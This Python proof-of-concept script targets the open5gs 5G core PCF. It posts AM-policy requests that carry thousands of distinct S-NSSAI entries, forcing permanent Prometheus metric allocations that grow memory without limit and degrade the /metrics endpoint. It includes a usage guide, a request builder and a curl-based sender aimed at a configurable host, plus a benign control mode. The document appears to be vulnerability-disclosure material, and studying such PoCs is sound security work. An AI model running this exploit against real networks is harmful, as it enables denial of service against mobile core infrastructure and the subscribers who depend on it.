#!/usr/bin/env python3
"""
PoC — open5gs PCF uncontrolled memory growth / /metrics degradation via
Npcf_AMPolicyControl S-NSSAI metric-cardinality explosion.

On POST /npcf-am-policy-control/v1/policies the PCF allocates one permanent
Prometheus metric instance per allowedSnssais element, keyed by the
client-controlled (plmn, sst, sd), into a hash that is never evicted at runtime
(src/pcf/npcf-handler.c:241-253, src/pcf/metrics.c:128-182/207-220). Distinct
S-NSSAIs therefore grow PCF RSS monotonically (~1.4 kB each) and inflate every
/metrics scrape; identical S-NSSAIs dedup in the hash (control).

Usage
-----
    # attack: N distinct S-NSSAIs starting at sd = SD_START (use a fresh sd range
    # per request to keep growing)
    python3 pcf_am_policy_metric_cardinality_poc.py --host 172.22.0.27 --port 7777 \
            --num-snssai 3000 --sd-start 1

    # benign control: the SAME single S-NSSAI repeated (hash dedups -> no growth)
    python3 pcf_am_policy_metric_cardinality_poc.py --host 172.22.0.27 --port 7777 \
            --num-snssai 3000 --sd-start 1 --control
"""
import argparse
import json
import subprocess
import sys

AM_POLICIES_PATH = "/npcf-am-policy-control/v1/policies"


def build_body(num_snssai: int, sd_start: int, supi: str, notif_uri: str,
               supp_feat: str, control: bool) -> str:
    if control:
        # All entries identical -> one hash key -> dedup, no cardinality growth.
        snssais = [{"sst": 1, "sd": "000001"} for _ in range(num_snssai)]
    else:
        # Distinct sd per entry -> distinct permanent metric instances.
        snssais = [{"sst": 1, "sd": "%06x" % (sd_start + i)}
                   for i in range(num_snssai)]
    return json.dumps({
        "supi": supi,
        "notificationUri": notif_uri,
        "suppFeat": supp_feat,
        "allowedSnssais": snssais,
    })


def post(url: str, body: str, timeout: int = 30):
    cmd = ["curl", "--http2-prior-knowledge", "-s", "-o", "/tmp/_pcf_leak_resp.txt",
           "-w", "%{http_code}", "--max-time", str(timeout),
           "-X", "POST", "-H", "Content-Type: application/json",
           "-d", body, url]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 10)
        code = int(p.stdout.strip() or 0)
        cexit = p.returncode
    except Exception as e:
        return 0, -1, f"<{e}>"
    try:
        with open("/tmp/_pcf_leak_resp.txt") as f:
            resp = f.read()
    except Exception:
        resp = ""
    return code, cexit, resp


def main():
    ap = argparse.ArgumentParser(
        description="open5gs PCF AM-policy S-NSSAI metric-cardinality memory-growth PoC")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=17777)
    ap.add_argument("--scheme", default="http")
    ap.add_argument("--num-snssai", type=int, default=3000,
                    help="number of allowedSnssais entries in this request")
    ap.add_argument("--sd-start", type=int, default=1,
                    help="first sd value (24-bit); use a fresh range per request to keep growing")
    ap.add_argument("--supi", default="imsi-460091234567895")
    ap.add_argument("--notif-uri", default="http://172.23.0.10:7777/namf-cb/v1/am-policy/x")
    ap.add_argument("--supp-feat", default="0")
    ap.add_argument("--control", action="store_true",
                    help="send identical S-NSSAIs (dedup) to show NO growth")
    args = ap.parse_args()

    url = f"{args.scheme}://{args.host}:{args.port}{AM_POLICIES_PATH}"
    body = build_body(args.num_snssai, args.sd_start, args.supi,
                      args.notif_uri, args.supp_feat, args.control)
    mode = "CONTROL (identical S-NSSAIs)" if args.control else \
        f"ATTACK ({args.num_snssai} distinct S-NSSAIs, sd {args.sd_start}..{args.sd_start + args.num_snssai - 1})"
    print(f"[*] target     : {url}")
    print(f"[*] mode       : {mode}")
    print(f"[*] body bytes : {len(body)}")
    code, cexit, resp = post(url, body)
    print(f"[*] POST       : HTTP {code} (curl exit {cexit}) resp={resp[:160]!r}")
    # The metric instances are allocated during parsing/handling regardless of the
    # final status (201/4xx/504), so any completed request demonstrates the growth.
    return 0


if __name__ == "__main__":
    sys.exit(main())
